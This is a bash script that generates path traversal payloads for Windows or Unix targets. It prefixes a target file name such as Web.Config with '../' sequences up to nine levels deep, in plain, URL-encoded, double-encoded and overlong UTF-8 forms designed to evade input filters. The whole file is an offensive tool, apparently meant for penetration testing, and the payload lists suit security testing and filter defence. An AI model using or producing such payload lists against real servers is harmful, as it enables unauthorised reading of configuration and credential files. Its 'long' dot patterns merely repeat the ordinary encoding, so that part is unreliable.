#!/bin/bash

# Author: MGreif

if [[ $# -ne 2 ]]
then
echo -e "Usage:\n\t $0 <windows|unix> <target-file-name>\nexample: $0 windows Web.Config\nexample: $0 windows config\\Web.Config"
exit 1
fi

if [[ "$1" != "windows" ]] && [[ "$1" != "unix" ]]
then
echo -e "Usage:\n\t $0 <windows|unix> <target-file-name>\nexample: $0 windows Web.Config\nexample: $0 windows config\\Web.Config"
exit 1
fi


SYSTEM=$1
FILE_NAME=$2

#		               	basic    URL-enc      double URL-enc    URL-enc long   double URL-enc long
PARENT_DIR_PATTERN_UNIX=(".." "%2e%2e" "%252e%252e" "%2e%2e" "%252e%252e")
PARENT_DIR_PATTERN_SLASH_UNIX=("/" "%2f" "%252f" "%c0%af" "%25c0%25af")
PARENT_DIR_PATTERN_WINDOWS=(".." "%2e%2e" "%252e%252e" "%2e%2e" "%252e%252e")
PARENT_DIR_PATTERN_SLASH_WINDOWS=("\\" "%5c" "%255c" "%c1%9c" "%25c1%259c")

MAX_ITERATIONS=8


for (( i=0; i<=$MAX_ITERATIONS; i++ ))
do
    for (( pattern=0; pattern<=4; pattern++ ))
    do
        # Selecting pattern
        active_pattern=${PARENT_DIR_PATTERN_UNIX[$pattern]}
        active_pattern_slash=${PARENT_DIR_PATTERN_SLASH_UNIX[$pattern]}
        if [[ "$SYSTEM" == "windows" ]]
        then
            active_pattern=${PARENT_DIR_PATTERN_WINDOWS[$pattern]}
            active_pattern_slash=${PARENT_DIR_PATTERN_SLASH_WINDOWS[$pattern]}

        fi

        # Replace input file path delim
        replaced_file_name=$(echo $FILE_NAME | sed -E "s#/|\\\#\\$active_pattern_slash#g")
        
        # Concat
        res=""
        for (( c=0; c<=$i; c++ ))
        do
        res="$res$active_pattern$active_pattern_slash"
        done
        echo $res$replaced_file_name
    done
done